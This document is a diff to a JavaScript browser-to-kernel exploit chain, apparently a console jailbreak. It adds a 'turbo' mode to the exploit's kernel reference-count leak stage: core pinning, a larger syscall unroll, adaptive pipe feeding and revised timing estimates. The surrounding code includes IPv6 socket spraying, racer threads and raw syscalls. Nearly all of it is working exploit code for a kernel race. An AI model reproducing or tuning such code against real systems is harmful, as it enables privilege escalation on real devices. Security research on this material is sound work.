@@ -130,24 +130,19 @@
         // Still 3x p2jb's original 64 and still ONE fireSync wake, which is what keeps the
         // free and the spray on the same core.
         const NUM_IPV6_SOCKETS = 192;
-        // Core plan derived from the PROCESS's real allowed mask (adapter reads it via
-        // cpuset_getaffinity). Y2JB could hardcode 0-3 + main 4 because its syscalls ran
-        // on the JS main thread; here they run on the poops WORKER, so "MAIN_CORE" is the
-        // EXECUTOR's core and the JS main thread is never pinned.
-        //
-        // FAST (default): reserve only the executor core; every other allowed core leaks.
-        //   6 allowed -> 5 leak (~38 min) vs the old 4-leak (~50 min) plan.
-        // STABLE (?stable=1): also leave a[len-2] entirely free for the unpinned JS main
-        //   thread so WebKit's hang watchdog never fires on saturated hardware.
+        // TURBO (default): pin the JS feed loop onto the executor core and run leak
+        // workers on every other allowed core. The old "fast" plan failed because the
+        // unpinned JS thread landed on saturated leak cores; pinning fixes that.
+        // ?safe=1: conservative plan (one free core, 8192 unroll, 500ms feed cadence).
         let MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
         let LEAK_CORES = [0, 1, 2, 3];
-        const _stable_cores = /\bstable=1\b/.test(location.search);
+        const _safe_turbo = /\bsafe=1\b/.test(location.search);
         (function planCores() {
             const a = window.P2JB_ALLOWED_CORES;
             if (!Array.isArray(a) || a.length < 2) return;
             MAIN_CORE = a[a.length - 1];
-            if (_stable_cores && a.length >= 3)
+            if (_safe_turbo && a.length >= 3)
                 LEAK_CORES = a.slice(0, a.length - 2);
             else
                 LEAK_CORES = a.slice(0, a.length - 1);
@@ -886,7 +881,7 @@
         async function setup_workers(S) {
             window.syncMark("SETUP-WORKERS-ENTER", "iov=" + IOV_THREAD_NUM + " uio=" + UIO_THREAD_NUM);
             window.liveStatus("cores: leak=[" + LEAK_CORES.join(",") + "] exec=" + MAIN_CORE
-                + (_stable_cores ? " (stable)" : " (fast)")
+                + (_safe_turbo ? " (safe)" : " (turbo)")
                 + "\nSETUP - spawning " + (IOV_THREAD_NUM + UIO_THREAD_NUM * 2) + " racer threads (thr_new)");
             S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
             S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
@@ -1551,7 +1546,7 @@
 
             syscall(SYSCALL.setuid, 1n);
 
-            await js_sleep(2000);
+            await js_sleep(_safe_turbo ? 2000 : 500);
 
             // FAST-ITERATION MODE (?skipleak=1): run the IDENTICAL code path but with a
             // tiny syscall budget so the ~40min cr_ref feed finishes in seconds. The race
@@ -1565,17 +1560,20 @@
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            // 8192 kqueueex per pipe byte (was 4096): halves pipe-driver overhead for the
-            // same TOTAL_SYSCALLS count. Stack is ~2 MiB per worker - fine via malloc.
-            const LEAK_UNROLL = 8192;
+            const LEAK_UNROLL = _safe_turbo ? 8192 : 16384;
             const U = BigInt(LEAK_UNROLL);
+            const FEED_CHUNK = _safe_turbo ? 8192 : 65536;
+            const PIPE_BUF = 65536n;
+            const FEED_STALL_MS = _safe_turbo ? 500 : 25;
+
+            if (!_safe_turbo) {
+                pin_to_core(MAIN_CORE);
+                window.syncMark("TURBO-PIN",
+                    "feed_core=" + MAIN_CORE + " on=" + get_current_core()
+                    + " leak_n=" + LEAK_CORES.length);
+            }
 
             const NW = LEAK_CORES.length;
-            const FEED_CHUNK = 8192;
-            // Backpressure cap: never let a pipe hold more than this many unread bytes.
-            // The old feed-then-drain design queued up to 64 KiB per worker (~8-10 extra
-            // minutes of silent work). Keeping the backlog shallow merges feed + drain.
-            const PIPE_BACKLOG_MAX = 4096n;
 
             const chunkbuf = malloc(FEED_CHUNK);
 
@@ -1606,7 +1604,7 @@
                 await ulog("SPAWN-" + w + "-PRE core=" + LEAK_CORES[w] + " entry=" + toHex(chain.entry));
                 const _th = spawn_leak_worker(chain.entry);
                 await ulog("SPAWN-" + w + "-POST handle=" + toHex(_th));
-                await js_sleep(50);
+                await js_sleep(_safe_turbo ? 50 : 25);
                 await ulog("SPAWN-" + w + "-ALIVE main survived after worker " + w);
                 const pendbuf = malloc(4); write32(pendbuf, 0n);
                 lws.push({
@@ -1619,67 +1617,64 @@
 
             let all_fed = false;
             const total_need = lws.reduce((a, l) => a + l.normal, 0n);
+            let feedLiveMs = 0;
             while (!all_fed) {
                 all_fed = true;
-                let any_blocked = false;
-                for (const lw of lws) {
-                    if (lw.queued >= lw.normal) continue;
-                    all_fed = false;
-                    write32(lw.pendbuf, 0n);
-                    const fio_w = syscall(SYSCALL.ioctl, BigInt(lw.rfd), FIONREAD, lw.pendbuf);
-                    let pending_w = 0n;
-                    if ((fio_w & 0xFFFFFFFFn) !== 0n) { any_blocked = true; continue; }
-                    pending_w = read32(lw.pendbuf) & 0xFFFFFFFFn;
-                    if (pending_w >= PIPE_BACKLOG_MAX) { any_blocked = true; continue; }
-                    let want = lw.normal - lw.queued;
-                    const room = PIPE_BACKLOG_MAX - pending_w;
-                    if (want > room) want = room;
-                    if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
-                    if (want <= 0n) { any_blocked = true; continue; }
-                    const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
-                    if (n > 0n && n <= want) lw.queued += n;
-                    else any_blocked = true;
-                }
-                // TRUE progress = bytes the workers have actually CONSUMED, not bytes we
-                // wrote. FIONREAD on the read end gives the bytes still sitting unread, so
-                // consumed = queued - pending.
+                let any_wrote = false;
                 let pending = 0n, fioOK = true;
-                for (const l of lws) {
+                const pendings = new Array(lws.length);
+                for (let i = 0; i < lws.length; i++) {
+                    const l = lws[i];
                     write32(l.pendbuf, 0n);
                     const r = syscall(SYSCALL.ioctl, BigInt(l.rfd), FIONREAD, l.pendbuf);
                     if ((r & 0xFFFFFFFFn) !== 0n) { fioOK = false; break; }
-                    pending += read32(l.pendbuf) & 0xFFFFFFFFn;
+                    const pw = read32(l.pendbuf) & 0xFFFFFFFFn;
+                    pendings[i] = pw;
+                    pending += pw;
+                }
+                if (!fioOK) pending = 0n;
+                for (let i = 0; i < lws.length; i++) {
+                    const lw = lws[i];
+                    if (lw.queued >= lw.normal) continue;
+                    all_fed = false;
+                    let want = lw.normal - lw.queued;
+                    if (!_safe_turbo) {
+                        const room = PIPE_BUF - pendings[i];
+                        if (room <= 0n) continue;
+                        if (want > room) want = room;
+                    }
+                    if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
+                    if (want <= 0n) continue;
+                    const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
+                    if (n > 0n && n <= want) { lw.queued += n; any_wrote = true; }
                 }
                 if (!window.__fioMarked) {
                     window.__fioMarked = 1;
                     window.syncMark("FIONREAD", "ok=" + fioOK + " pending=" + pending
-                        + " backlog_cap=" + PIPE_BACKLOG_MAX);
+                        + " turbo=" + (_safe_turbo ? 0 : 1));
                 }
-                if (!fioOK) pending = 0n;
                 const fed_b = lws.reduce((a, l) => a + l.queued, 0n);
                 let done_b = fed_b - pending;
                 if (done_b < 0n) done_b = 0n;
                 const pct = Number((done_b * 10000n) / total_need) / 100;
-                window.liveStatus(
-                    "STAGE 0 - cr_ref leak (" + NW + " cores, " + LEAK_UNROLL + "x unroll"
-                    + (_stable_cores ? ", stable cores" : ", fast cores") + ")\n"
-                    + "consumed " + done_b + " / " + total_need + " bytes = "
-                    + (done_b * U) + " kqueueex\n"
-                    + "queued " + fed_b + "  in-pipe " + pending + "\n"
-                    + "per-core: " + lws.map(l => (Number((l.queued * 1000n) / l.normal) / 10).toFixed(1) + "%").join("  "),
-                    pct, "leak");
-                if (!all_fed) await js_sleep(any_blocked ? 25 : 50);
+                const now = Date.now();
+                if (now - feedLiveMs >= (_safe_turbo ? 500 : 1000)) {
+                    feedLiveMs = now;
+                    window.liveStatus(
+                        "STAGE 0 - cr_ref leak (" + NW + " cores, " + LEAK_UNROLL + "x unroll"
+                        + (_safe_turbo ? ", safe" : ", turbo") + ")\n"
+                        + "consumed " + done_b + " / " + total_need + " bytes = "
+                        + (done_b * U) + " kqueueex\n"
+                        + "queued " + fed_b + "  in-pipe " + pending + "\n"
+                        + "per-core: " + lws.map(l => (Number((l.queued * 1000n) / l.normal) / 10).toFixed(1) + "%").join("  "),
+                        pct, "leak");
+                }
+                if (!all_fed) await js_sleep(any_wrote ? 0 : FEED_STALL_MS);
             }
             window.liveStatus("STAGE 0 - feed COMPLETE, draining workers", 100, "leak");
 
-            // DRAIN PHASE. Backpressure feeding keeps pipes shallow, so this is usually
-            // seconds, not the old 8-10 minute 64 KiB-per-worker backlog.
-            //
-            // The bytes still buffered are directly measurable: the same FIONREAD the feed
-            // loop already uses. Since every worker is fully queued by now, "queued" is
-            // constant at total_need, so consumed = total_need - pending and the SAME
-            // progress formula carries straight through the drain. 3 ioctls per 1.5s tick
-            // costs nothing next to what the workers are doing.
+            // DRAIN PHASE. The feed loop has queued every byte, but up to 64KB per worker
+            // is still sitting in the pipes. Progress reporting continues through drain.
             const drainPending = () => {
                 let pend = 0n;
                 for (const l of lws) {
@@ -1707,13 +1702,14 @@
                     pct, "drain");
             };
             drainReport(0);
+            const drainPollMs = _safe_turbo ? 500 : 100;
             for (let di = 0; di < lws.length; di++) {
                 const lw = lws[di];
                 window.syncMark("DRAIN", "worker=" + di + "/" + lws.length + " waiting");
                 let spins = 0;
                 while (true) {
                     write64(lw.finished, 0n);
-                    await js_sleep(500);
+                    await js_sleep(drainPollMs);
                     if (read64(lw.finished) === 0n) break;
                     drainReport(di);
                     if ((++spins % 20) === 0)
@@ -4234,30 +4230,32 @@
             " victim=" + S.victim_rfd + "," + S.victim_wfd);
 
         const leak_nw = LEAK_CORES.length;
-        // Baseline ~50 min at 4 cores / 4096 unroll / 64 KiB pipe backlog.
-        // Fast path: +1 leak core, 8192 unroll, shallow pipes -> ~35-40% faster.
+        // Turbo: max leak cores + pinned feed + 16384 unroll + adaptive pipe fill.
+        // Still bounded by ~2^32 kqueueex total; web path ceiling ~30-38 min on 12.40.
         let eta_minutes;
-        switch (leak_nw) {
-            case 1: eta_minutes = 120; break;
-            case 2: eta_minutes = 75; break;
-            case 3: eta_minutes = 50; break;
-            case 4: eta_minutes = 38; break;
-            case 5: eta_minutes = 32; break;
-            case 6: eta_minutes = 27; break;
-            default: eta_minutes = Math.max(20, Math.round(38 * 4 / leak_nw)); break;
-        }
-        if (_stable_cores) {
+        if (_safe_turbo) {
             switch (leak_nw) {
-                case 2: eta_minutes = 90; break;
-                case 3: eta_minutes = 60; break;
-                case 4: eta_minutes = 50; break;
-                default:
-                    if (leak_nw < 4) break;
-                    eta_minutes = Math.round(48 * 4 / leak_nw);
+                case 1: eta_minutes = 120; break;
+                case 2: eta_minutes = 75; break;
+                case 3: eta_minutes = 55; break;
+                case 4: eta_minutes = 46; break;
+                case 5: eta_minutes = 40; break;
+                default: eta_minutes = Math.max(20, Math.round(46 * 4 / leak_nw)); break;
+            }
+        } else {
+            switch (leak_nw) {
+                case 1: eta_minutes = 90; break;
+                case 2: eta_minutes = 55; break;
+                case 3: eta_minutes = 38; break;
+                case 4: eta_minutes = 32; break;
+                case 5: eta_minutes = 28; break;
+                case 6: eta_minutes = 24; break;
+                default: eta_minutes = Math.max(18, Math.round(32 * 4 / leak_nw)); break;
             }
         }
-        window.syncMark("LEAK-TUNE", "cores=" + leak_nw + " unroll=8192 backlog="
-            + "4096 stable=" + (_stable_cores ? 1 : 0) + " eta_min=" + eta_minutes);
+        window.syncMark("LEAK-TUNE", "cores=" + leak_nw + " unroll="
+            + (_safe_turbo ? 8192 : 16384) + " turbo=" + (_safe_turbo ? 0 : 1)
+            + " eta_min=" + eta_minutes);
         const eta_str = eta_minutes < 60
             ? "~" + eta_minutes + " min"
             : "~" + Math.floor(eta_minutes / 60) + "h" +
